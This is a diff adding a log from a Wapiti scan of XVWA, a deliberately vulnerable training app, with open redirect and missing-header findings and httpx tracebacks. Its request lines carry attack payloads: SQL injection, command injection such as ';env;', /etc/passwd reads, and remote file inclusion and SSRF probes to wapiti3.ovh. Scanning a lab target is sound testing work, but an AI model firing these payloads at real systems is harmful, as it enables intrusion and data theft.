@@ -1,0 +1,766 @@
+2024-03-20 15:28:21.223 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:21.370 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-20 15:28:21.370 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_3e7b1455.db
+2024-03-20 15:28:21.375 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
+2024-03-20 15:28:21.407 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-20 15:28:21.408 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-20 15:28:21.525 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-20 15:28:21.533 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-20 15:28:21.534 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-20 15:28:21.549 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:21.550 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fjp2xk2%2F1%2F666f7277617264%2F (0)
+2024-03-20 15:28:21.583 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=jp2xk2 for results, please wait...
+2024-03-20 15:28:23.688 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-20 15:28:23.705 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:23.742 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-20 15:28:23.760 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:23.765 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
+2024-03-20 15:28:23.773 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
+2024-03-20 15:28:23.782 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%2Fetc%2Fpasswd (0)
+2024-03-20 15:28:23.790 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%2Fetc%2Fpasswd%00 (0)
+2024-03-20 15:28:23.798 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%2Fetc%2Fservices (0)
+2024-03-20 15:28:23.806 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%2Fetc%2Fservices%00 (0)
+2024-03-20 15:28:23.814 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
+2024-03-20 15:28:23.822 | ERROR    | wapitiCore.controller.wapiti:attack:520 - InvalidURL
+Traceback (most recent call last):
+
+  File "/usr/local/bin/wapiti", line 8, in <module>
+    sys.exit(wapiti_asyncio_wrapper())
+    │   │    └ <function wapiti_asyncio_wrapper at 0x7cf18f758900>
+    │   └ <built-in function exit>
+    └ <module 'sys' (built-in)>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 395, in wapiti_asyncio_wrapper
+    asyncio.run(wapiti_main())
+    │       │   └ <function wapiti_main at 0x7cf18f758860>
+    │       └ <function run at 0x7cf19444f560>
+    └ <module 'asyncio' from '/usr/local/lib/python3.11/asyncio/__init__.py'>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 190, in run
+    return runner.run(main)
+           │      │   └ <coroutine object wapiti_main at 0x7cf18f98b240>
+           │      └ <function Runner.run at 0x7cf1942dafc0>
+           └ <asyncio.runners.Runner object at 0x7cf18fa38990>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 118, in run
+    return self._loop.run_until_complete(task)
+           │    │     │                  └ <Task cancelling name='Task-1' coro=<wapiti_main() running at /usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti....
+           │    │     └ <function BaseEventLoop.run_until_complete at 0x7cf1942d8c20>
+           │    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+           └ <asyncio.runners.Runner object at 0x7cf18fa38990>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 641, in run_until_complete
+    self.run_forever()
+    │    └ <function BaseEventLoop.run_forever at 0x7cf1942d8b80>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 608, in run_forever
+    self._run_once()
+    │    └ <function BaseEventLoop._run_once at 0x7cf1942da980>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 1936, in _run_once
+    handle._run()
+    │      └ <function Handle._run at 0x7cf194438e00>
+    └ <Handle <TaskStepMethWrapper object at 0x7cf18f3e1840>()>
+  File "/usr/local/lib/python3.11/asyncio/events.py", line 84, in _run
+    self._context.run(self._callback, *self._args)
+    │    │            │    │           │    └ <member '_args' of 'Handle' objects>
+    │    │            │    │           └ <Handle <TaskStepMethWrapper object at 0x7cf18f3e1840>()>
+    │    │            │    └ <member '_callback' of 'Handle' objects>
+    │    │            └ <Handle <TaskStepMethWrapper object at 0x7cf18f3e1840>()>
+    │    └ <member '_context' of 'Handle' objects>
+    └ <Handle <TaskStepMethWrapper object at 0x7cf18f3e1840>()>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 382, in wapiti_main
+    await wap.attack(global_stop_event)
+          │   │      └ <asyncio.locks.Event object at 0x7cf1942dc390 [unset]>
+          │   └ <function Wapiti.attack at 0x7cf18f70e520>
+          └ <wapitiCore.controller.wapiti.Wapiti object at 0x7cf18fabae90>
+> File "/usr/local/lib/python3.11/site-packages/wapitiCore/controller/wapiti.py", line 503, in attack
+    await attack_module.attack(original_request, original_response)
+          │             │      │                 └ <wapitiCore.net.response.Response object at 0x7cf18f3c4a10>
+          │             │      └ GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+          │             └ <function ModuleFile.attack at 0x7cf18f36fd80>
+          └ <wapitiCore.attack.mod_file.ModuleFile object at 0x7cf18f3e4ad0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/attack/mod_file.py", line 166, in attack
+    response = await self.crawler.async_send(mutated_request)
+                     │    │       │          └ GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
+                     │    │       └ <function AsyncCrawler.async_send at 0x7cf19313a020>
+                     │    └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7cf18f69d990>
+                     └ <wapitiCore.attack.mod_file.ModuleFile object at 0x7cf18f3e4ad0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 386, in async_send
+    response = await self.async_get(request, headers=headers,
+                     │    │         │                └ None
+                     │    │         └ GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
+                     │    └ <function AsyncCrawler.async_get at 0x7cf19313a160>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7cf18f69d990>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 59, in inner_wrapper
+    value = await function(*args, **kwargs)
+                  │         │       └ {'headers': None, 'follow_redirects': False, 'stream': False, 'timeout': None}
+                  │         └ (<wapitiCore.net.crawler.AsyncCrawler object at 0x7cf18f69d990>, GET http://web/xvwa/vulnerabilities/redirect/redirect.php?fo...
+                  └ <function AsyncCrawler.async_get at 0x7cf19313a0c0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 238, in async_get
+    response = await self._client.send(
+                     │    │       └ <function AsyncClient.send at 0x7cf1936a11c0>
+                     │    └ <httpx.AsyncClient object at 0x7cf18faba3d0>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7cf18f69d990>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1617, in send
+    response = await self._send_handling_auth(
+                     │    └ <function AsyncClient._send_handling_auth at 0x7cf1936a1260>
+                     └ <httpx.AsyncClient object at 0x7cf18faba3d0>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1645, in _send_handling_auth
+    response = await self._send_handling_redirects(
+                     │    └ <function AsyncClient._send_handling_redirects at 0x7cf1936a1300>
+                     └ <httpx.AsyncClient object at 0x7cf18faba3d0>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1703, in _send_handling_redirects
+    raise exc
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1692, in _send_handling_redirects
+    request = self._build_redirect_request(request, response)
+              │    │                       │        └ <Response [302 Found]>
+              │    │                       └ <Request('GET', 'http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cse...
+              │    └ <function BaseClient._build_redirect_request at 0x7cf193693c40>
+              └ <httpx.AsyncClient object at 0x7cf18faba3d0>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 465, in _build_redirect_request
+    url = self._redirect_url(request, response)
+          │    │             │        └ <Response [302 Found]>
+          │    │             └ <Request('GET', 'http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cse...
+          │    └ <function BaseClient._redirect_url at 0x7cf193693d80>
+          └ <httpx.AsyncClient object at 0x7cf18faba3d0>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 517, in _redirect_url
+    url = url.copy_with(host=request.url.host)
+          │   │              │       │   └ <property object at 0x7cf193da5ee0>
+          │   │              │       └ URL('http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices')
+          │   │              └ <Request('GET', 'http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cse...
+          │   └ <function URL.copy_with at 0x7cf193db18a0>
+          └ URL('c:%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices')
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 348, in copy_with
+    return URL(self, **kwargs)
+           │   │       └ {'host': 'web'}
+           │   └ URL('c:%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices')
+           └ <class 'httpx.URL'>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 115, in __init__
+    self._uri_reference = url._uri_reference.copy_with(**kwargs)
+    │                     │   │              │           └ {'host': 'web'}
+    │                     │   │              └ <function ParseResult.copy_with at 0x7cf193db0400>
+    │                     │   └ ParseResult(scheme='c', userinfo='', host='', port=None, path='%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices', query=None,...
+    │                     └ URL('c:%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices')
+    └ <unprintable URL object>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 134, in copy_with
+    return urlparse("", **defaults)
+           │              └ {'scheme': 'c', 'authority': '', 'path': '%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices', 'query': None, 'fragment': None,...
+           └ <function urlparse at 0x7cf193db0220>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 252, in urlparse
+    validate_path(path, has_scheme=has_scheme, has_authority=has_authority)
+    │             │                │                         └ True
+    │             │                └ True
+    │             └ '%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices'
+    └ <function validate_path at 0x7cf193db0a40>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 369, in validate_path
+    raise InvalidURL("For absolute URLs, path must be empty or begin with '/'")
+          └ <class 'httpx.InvalidURL'>
+
+httpx.InvalidURL: For absolute URLs, path must be empty or begin with '/'
+2024-03-20 15:28:23.858 | INFO     | wapitiCore.controller.wapiti:send_bug_report:616 - Wapiti 3.1.8. httpx 0.24.1. OS linux
+2024-03-20 15:28:23.960 | SUCCESS  | wapitiCore.controller.wapiti:send_bug_report:627 - Sending crash report 7d84f328-e6ce-11ee-8e48-0242ac160004 ... SUCCESS
+2024-03-20 15:28:23.963 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-20 15:28:24.002 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-20 15:28:24.024 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:24.041 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-20 15:28:24.057 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:24.064 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-20 15:28:24.134 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-20 15:28:24.146 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:24.146 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%C2%BF%27%22%28 (0)
+2024-03-20 15:28:24.161 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%20AND%2023%3D75%20AND%2028%3D28 (0)
+2024-03-20 15:28:24.168 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%20AND%2094%3D109%20AND%2036%3D36 (0)
+2024-03-20 15:28:24.176 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%20AND%2045%3D45%20AND%2053%3D53 (0)
+2024-03-20 15:28:24.182 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%27%20AND%2080%3D158%20AND%20%2774%27%3D%2774 (0)
+2024-03-20 15:28:24.189 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%27%20AND%2092%3D113%20AND%20%2715%27%3D%2715 (0)
+2024-03-20 15:28:24.196 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%27%20AND%2088%3D88%20AND%20%2742%27%3D%2742 (0)
+2024-03-20 15:28:24.204 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%22%20AND%2055%3D89%20AND%20%2287%22%3D%2287 (0)
+2024-03-20 15:28:24.211 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%22%20AND%2041%3D100%20AND%20%2249%22%3D%2249 (0)
+2024-03-20 15:28:24.218 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%22%20AND%2028%3D28%20AND%20%2286%22%3D%2286 (0)
+2024-03-20 15:28:24.226 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%29%20AND%2011%3D108%20AND%20%2869%3D69 (0)
+2024-03-20 15:28:24.233 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%29%20AND%2016%3D42%20AND%20%2871%3D71 (0)
+2024-03-20 15:28:24.239 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%29%20AND%2016%3D16%20AND%20%2864%3D64 (0)
+2024-03-20 15:28:24.246 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%27%29%20AND%2051%3D101%20AND%20%28%2758%27%3D%2758 (0)
+2024-03-20 15:28:24.254 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%27%29%20AND%2027%3D85%20AND%20%28%2775%27%3D%2775 (0)
+2024-03-20 15:28:24.261 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%27%29%20AND%2045%3D45%20AND%20%28%2753%27%3D%2753 (0)
+2024-03-20 15:28:24.269 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%22%29%20AND%2024%3D49%20AND%20%28%2265%22%3D%2265 (0)
+2024-03-20 15:28:24.276 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%22%29%20AND%2056%3D80%20AND%20%28%2237%22%3D%2237 (0)
+2024-03-20 15:28:24.283 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%22%29%20AND%2096%3D96%20AND%20%28%2265%22%3D%2265 (0)
+2024-03-20 15:28:24.316 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-20 15:28:24.333 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:24.342 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-20 15:28:24.342 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-20 15:28:24.409 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-20 15:28:24.409 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-20 15:28:24.481 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-20 15:28:24.493 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:24.493 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=https%3A%2F%2Fopenbugbounty.org%2F
+2024-03-20 15:28:24.571 | RED      | wapitiCore.attack.mod_redirect:attack:79 - ---
+2024-03-20 15:28:24.572 | RED      | wapitiCore.attack.mod_redirect:attack:80 - Open Redirect in http://web/xvwa/vulnerabilities/redirect/redirect.php via injection in the query string
+2024-03-20 15:28:24.572 | RED      | wapitiCore.attack.mod_redirect:attack:86 - Evil request:
+2024-03-20 15:28:24.572 | RED      | wapitiCore.attack.mod_redirect:attack:87 -     GET /xvwa/vulnerabilities/redirect/redirect.php?forward=https%3A%2F%2Fopenbugbounty.org%2F HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+2024-03-20 15:28:24.572 | RED      | wapitiCore.attack.mod_redirect:attack:88 - ---
+2024-03-20 15:28:24.572 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%2F%2Fopenbugbounty.org%2F
+2024-03-20 15:28:24.633 | RED      | wapitiCore.attack.mod_redirect:attack:79 - ---
+2024-03-20 15:28:24.634 | RED      | wapitiCore.attack.mod_redirect:attack:80 - Open Redirect in http://web/xvwa/vulnerabilities/redirect/redirect.php via injection in the query string
+2024-03-20 15:28:24.634 | RED      | wapitiCore.attack.mod_redirect:attack:86 - Evil request:
+2024-03-20 15:28:24.634 | RED      | wapitiCore.attack.mod_redirect:attack:87 -     GET /xvwa/vulnerabilities/redirect/redirect.php?forward=%2F%2Fopenbugbounty.org%2F HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+2024-03-20 15:28:24.634 | RED      | wapitiCore.attack.mod_redirect:attack:88 - ---
+2024-03-20 15:28:24.649 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-20 15:28:24.665 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz (0)
+2024-03-20 15:28:24.667 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%3Benv%3B (0)
+2024-03-20 15:28:24.672 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%7Cenv%7C (0)
+2024-03-20 15:28:24.677 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=a%3Benv%3B (0)
+2024-03-20 15:28:24.681 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=a%3Benv%3B (0)
+2024-03-20 15:28:24.686 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
+2024-03-20 15:28:24.691 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%3Benv%3B (0)
+2024-03-20 15:28:24.695 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=fuzz%0Aenv%3B (0)
+2024-03-20 15:28:24.699 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%26set%26 (0)
+2024-03-20 15:28:24.704 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=set (0)
+2024-03-20 15:28:24.708 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=env (0)
+2024-03-20 15:28:24.713 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%2Fe%00 (0)
+2024-03-20 15:28:24.717 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 15:28:24.722 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 15:28:24.726 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 15:28:24.731 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 15:28:24.736 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 15:28:24.740 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 15:28:24.744 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 15:28:24.749 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 15:28:24.755 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 15:28:24.761 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 15:28:24.767 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 15:28:24.773 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 15:28:24.778 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/redirect/redirect.php?forward=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
+2024-03-20 15:28:24.783 | ERROR    | wapitiCore.controller.wapiti:attack:520 - InvalidURL
+Traceback (most recent call last):
+
+  File "/usr/local/bin/wapiti", line 8, in <module>
+    sys.exit(wapiti_asyncio_wrapper())
+    │   │    └ <function wapiti_asyncio_wrapper at 0x7cf18f758900>
+    │   └ <built-in function exit>
+    └ <module 'sys' (built-in)>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 395, in wapiti_asyncio_wrapper
+    asyncio.run(wapiti_main())
+    │       │   └ <function wapiti_main at 0x7cf18f758860>
+    │       └ <function run at 0x7cf19444f560>
+    └ <module 'asyncio' from '/usr/local/lib/python3.11/asyncio/__init__.py'>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 190, in run
+    return runner.run(main)
+           │      │   └ <coroutine object wapiti_main at 0x7cf18f98b240>
+           │      └ <function Runner.run at 0x7cf1942dafc0>
+           └ <asyncio.runners.Runner object at 0x7cf18fa38990>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 118, in run
+    return self._loop.run_until_complete(task)
